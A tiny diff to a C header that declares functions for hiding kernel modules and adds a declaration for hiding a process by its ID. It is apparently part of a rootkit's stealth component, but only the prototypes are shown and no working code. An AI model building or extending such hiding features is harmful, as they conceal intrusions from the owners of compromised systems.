@@ -22,5 +22,6 @@
 
 void hide_kld(char *kld_name);
 void hide_ko(char *ko_name);
+void hide_process_by_id(pid_t id);
 
 #endif /* HIDE_H */
